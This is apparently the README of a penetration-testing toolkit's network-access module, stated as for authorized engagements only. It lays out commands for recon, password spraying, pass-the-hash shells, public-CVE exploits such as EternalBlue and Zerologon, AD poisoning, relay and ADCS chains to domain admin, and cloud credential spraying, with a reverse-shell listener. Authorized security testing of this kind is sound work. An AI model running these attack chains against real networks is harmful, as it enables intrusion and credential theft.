# access/network — recon · credential access · public-CVE · AD · cloud → shell
> **Which access surface?** You're in `access/network/` — **cred / network-service / public-CVE / AD / cloud**. Siblings: `../web/` (a **web app**) · `../services/` (a **service left open**). (See `../../START-HERE.md`.)

**Get the FIRST code-execution foothold, then hand off to privesc.** Attacker 10.0.0.10. The `gen_*.py`/`enum_net.py`
scripts run on YOUR box and *print* commands driving nmap/nuclei/netexec/impacket/evil-winrm — you paste the output.
The foothold this produces is exactly what `winpriv`/`linpriv` assume. **Authorized engagements only.**

## The funnel
```
enum_net.py         → discover hosts/ports/services, deep-enum each, self-recommend a bucket
   ├─ creds found   → gen_shell.py   (cred/hash → shell = the privesc foothold)     ← Bucket D
   ├─ users only    → gen_spray.py      (spray a password — MIND THE LOCKOUT POLICY)   ← Bucket B
   ├─ service+CVE   → gen_exploit.py    (public-service exploit, version-match/PoC)     ← Bucket A
   └─ a web app     → ../web/      (SQLi→xp_cmdshell / LFI / RCE / upload / SSRF)  ← app exploitation
→ shell → paste  winpriv/enum.bat  or  linpriv/enum.sh  → privesc → report/
```

## How these scripts work (read first)
- **Run on the ATTACKER box; they only PRINT.** You paste the commands (or run the printed tool line) yourself.
- **One-time config** in `_network_common.py`: `LHOST`/`LPORT`/`DOMAIN` + `USERLIST`/`PASSLIST` paths (SecLists — pre-stage for air-gap).
- **They drive best-in-class tools** (nmap, nuclei, netexec/nxc, kerbrute, impacket, evil-winrm, hydra, ffuf).
- **Reading the steps:** `<x>` = you supply · `[T1]`/`[T2]` = SEPARATE terminals, run at the same time · `needs:` = precondition (check it or it won't work) · `-> ok:` = what confirms the step worked.

## Many targets? triage FIRST, then exploit per-host
The per-technique generators are **single-target by design** (actual exploitation needs human judgment — you don't mass-fire exploits). But the **scan/triage phase is fully multi-target**, and that's how you cut a 480-host list down to the handful worth manual effort:
```bash
python3 sweep.py plan   --targets targets.txt        # prints the mass-scan sequence (nmap -iL · nxc <list> · nuclei -l)
#   (run those; they read the whole list and drive the tools that natively accept a file/CIDR)
python3 sweep.py plan   --targets targets.txt --oneshot > mass-scan.sh && sh mass-scan.sh   # ONE runnable
#                                                            script that hits the whole scope in a single kickoff (nmap+nxc+nuclei)
python3 sweep.py triage --nmap ports.gnmap --nxc smb.txt   # -> ranked SCOREBOARD: which hosts have quick-wins + which generator
```
`triage` sorts every host by likely quick-win (exposed-RCE/unauth first) and names the generator per finding — so you focus the top of the list. **Spray and poisoning are also inherently multi-host** (`nxc smb <list>`, Responder is network-wide); only the exploitation chains are per-host.

## Attempt EVERY vector — one foothold ≠ done
Like privesc: **a working foothold on a host does not mean you stop.** For an assessment, enumerate and **document every initial-access path** that host exposes (each open service / web flaw / weak cred is its own finding, whether or not you needed it). `sweep.py triage` and `enum_net` list them all; work them all, exploit the safest/quietest first, and log each in `report/`. Fixing one entry point does not close the others.

## STEP 1 — recon (always first)
```bash
python3 enum_net.py --range 10.0.0.0/24        # live hosts
python3 enum_net.py --target 10.0.0.5          # full port/service sweep + per-service deep enum + bucket hints
python3 enum_net.py --target 10.0.0.5 --smb    # deep SMB/AD (null session, shares, users, LOCKOUT POLICY)
python3 enum_net.py --target 10.0.0.5 --web    # deep web (whatweb/httpx/nuclei/ffuf)
```
It maps every open port to its follow-up and prints `==> gen_xxx` for each finding. **Read the AD lockout policy before any spray.**

## Bucket B — password spray (get a credential)
```bash
python3 gen_spray.py --proto smb --users users.txt --password 'Season2025!' --target 10.0.0.5
# protos: smb | winrm | ssh | rdp | mssql | ldap | ftp | http-get | http-post | kerberos | mysql
```
**LOCKOUT SAFETY — the #1 way to damage a client:**
- **Spray, don't brute:** ONE password across MANY users per window — never many passwords per user.
- **Read the policy first:** `nxc smb <dc> -u <u> -p <p> --pass-pol` (default AD = 5 tries / 30 min). Stay under it.
- **Found creds first** (reuse before guessing). Skip lockout-prone accounts. **Log attempts/user.** If accounts start locking, **STOP.**
- `kerberos` AS-REP roast needs no password at all (preauth-disabled users) → crack offline (`hashcat -m 18200`).

## Bucket D — credential/hash → shell (the foothold)
```bash
python3 gen_shell.py --target 10.0.0.5 --user administrator --pass 'P@ss' --proto smb
python3 gen_shell.py --target 10.0.0.5 --user admin --hash <NTLM> --proto smb    # Pass-the-Hash
# protos: smb | winrm | mssql | ssh | rdp
```
| Method | Runs as | Noise |
|---|---|---|
| `wmiexec` / `atexec` / `dcomexec` (SMB) | the **user** | **quieter** — no service (prefer these) |
| `smbexec` / `psexec` (SMB) | **SYSTEM** | loud — service creation (event 7045, AV/EDR) |
| `evil-winrm` (WinRM) | the user | moderate; interactive |
| `mssqlclient` → `xp_cmdshell` (MSSQL) | **SQL service acct** (usually SeImpersonate) | = privesc **Route 1** |
| `ssh` (Linux) · `xfreerdp` (RDP) | the user | interactive |

**Handoff:** admin cred → SYSTEM directly (still enumerate for the report); low-priv → user shell → paste `winpriv/enum.bat` or run `linpriv/enum.sh`; MSSQL → `whoami /priv`, if SeImpersonate → `winpriv` Route 1.

## Bucket A — public-service exploitation (known CVE on an exposed service)
```bash
python3 gen_exploit.py list [web|edge|windows|classic]     # 25 curated CVEs (Log4Shell, ProxyShell, Citrix, EternalBlue, Zerologon…)
python3 gen_exploit.py find --service exchange --version 2019   # map a discovered service → candidates (searchsploit/nuclei/msf)
python3 gen_exploit.py proxyshell                          # run-through: version-check → msf module / supplied PoC → shell
```
Same model as the Linux kernel-CVE bucket: **version-MATCH first**, several need a **PoC you supply** (pre-stage — `../../SUPPLIED-BINARIES.md`), and the intrusive ones (**eternalblue/bluekeep/zerologon**) can **crash the host/DC** — snapshot + sign-off. Msf-backed entries print the ready `msfconsole -x` line.

## AD internal — poison / relay / coerce / ADCS (the modern no-creds → DA core)
On an internal network, you often get the first credential (or straight to DA) **without** phishing or a public CVE:
```bash
python3 gen_poison.py responder                    # LLMNR/NBT-NS/mDNS poison → capture NetNTLMv2 (analyze first!)
python3 gen_poison.py mitm6 --domain corp.local    # IPv6 DNS takeover → WPAD → relay
python3 gen_relay.py adcs --dc <DC> --ca-host <CA> # ESC8: coerce a DC → relay to ADCS web-enroll → DC cert → DA
python3 gen_relay.py ldap --dc <DC>                # relay → RBCD / add-computer
python3 gen_relay.py smb  --targets t.txt          # relay → exec/secretsdump (SMB signing off)
python3 gen_relay.py coerce --victim <host>        # PetitPotam/PrinterBug/DFSCoerce/Coercer triggers
python3 gen_adcs.py find --user u --pass p --dc <DC> --domain corp.local   # ESC1-16; esc1/auth to weaponize
```
Typical chains: **Responder → crack/relay** · **PetitPotam → relay → ESC8 → DA** · **certipy ESC1 → cert → PKINIT → DA**. NetNTLMv2 **can't** be PtH'd — crack or relay. **Intrusive + noisy** — analyze-mode first, coordinate, time-box; added computers/delegation/certs are **artifacts to clean up**.

## Cloud identity (M365 / Entra / Okta) — spray + token (no AiTM)
```bash
python3 gen_cloud.py enum  --domain corp.com                    # is it M365? user/tenant enum (no lockout)
python3 gen_cloud.py spray --domain corp.com --users u.txt --password 'Spring2025!'   # SMART-LOCKOUT-safe
python3 gen_cloud.py mfa   --user user@corp.com --pass p        # find MFA gaps (legacy auth)
python3 gen_cloud.py token --user user@corp.com --pass p        # roadtx tokens → tenant enum (roadrecon)
```
Entra **Smart Lockout** (~10/user/window) — spray 1 pw/round, throttle hard. Legacy-auth endpoints (EWS/IMAP) often bypass MFA. **AiTM session-phishing is intentionally excluded.** Cloud reach may be **out of ROE** — confirm scope.

## Safety / AV / OPSEC
- **Spraying = lockout/DoS risk** (above). **Service exploits (Phase 3) can crash prod** — snapshot + sign-off.
- **`psexec`/`smbexec` create a service and any dropped binary is AV/EDR-visible** — prefer `wmiexec`/WinRM; recompile ⚠ tools (see `../../SUPPLIED-BINARIES.md`).
- **Never VirusTotal** a payload; validate against the target AV in a lab (see `winpriv/CHEATSHEET.md` AV/EDR section).
- **Authorized scope only.** Stay in ROE; treat recovered creds/hashes as sensitive client data.

## Execution model
Attacker: `enum_net`/`gen_*` (print) · the tools they drive (nmap/nuclei/nxc/impacket/evil-winrm/hydra/ffuf) · catcher (`nc -lvnp`).
Target: the resulting shell + the pasted `enum.bat`/`enum.sh`. `report/preflight.sh` checks the attacker-side tools.

---
Phase 2 (`gen_web.py` — SQLi→xp_cmdshell / upload→webshell / RCE) and Phase 3 (`gen_exploit.py` — public-service CVEs) extend this. Findings → `report/gen_report.py` (initial-access `vector_type`s are in the KB).
